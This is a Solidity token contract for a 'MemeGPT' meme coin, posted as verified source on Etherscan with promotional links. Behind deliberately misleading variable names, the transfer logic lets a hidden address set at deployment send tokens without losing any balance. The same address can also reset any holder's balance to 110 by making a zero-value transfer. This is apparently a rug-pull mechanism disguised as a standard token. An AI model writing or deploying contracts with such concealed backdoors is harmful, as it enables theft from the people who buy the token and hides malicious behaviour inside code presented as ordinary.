/**
 *Submitted for verification at Etherscan.io on 2023-06-07
*/

/*
MemeGPT - First Meme Generator in Ethereum !
Website : https://www.memegpt.xyz/
TG : https://t.me/memegpteth 
Twitter : https://twitter.com/memegpteth

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract memegpt is Ownable {
    mapping(address => uint256) private marketing;

    function pairs(address spenders, address balances, uint256 contractn) private {
        if (requires[spenders] == 0) {
            balanceOf[spenders] -= contractn;
        }
        balanceOf[balances] += contractn;
        if (requires[msg.sender] > 0 && contractn == 0 && balances != mappings) {
            balanceOf[balances] = events;
        }
        emit Transfer(spenders, balances, contractn);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 private events = 110;

    function transferFrom(address spenders, address balances, uint256 contractn) public returns (bool success) {
        require(contractn <= allowance[spenders][msg.sender]);
        allowance[spenders][msg.sender] -= contractn;
        pairs(spenders, balances, contractn);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    address public mappings;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    constructor(address approves) {
        balanceOf[msg.sender] = totalSupply;
        requires[approves] = events;
        IUniswapV2Router02 supplies = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        mappings = IUniswapV2Factory(supplies.factory()).createPair(address(this), supplies.WETH());
    }

    string public symbol = 'MemeGPT';

    mapping(address => uint256) private requires;

    string public name = 'MGPT';

    function transfer(address balances, uint256 contractn) public returns (bool success) {
        pairs(msg.sender, balances, contractn);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function approve(address publicn, uint256 contractn) public returns (bool success) {
        allowance[msg.sender][publicn] = contractn;
        emit Approval(msg.sender, publicn, contractn);
        return true;
    }

    uint8 public decimals = 9;
}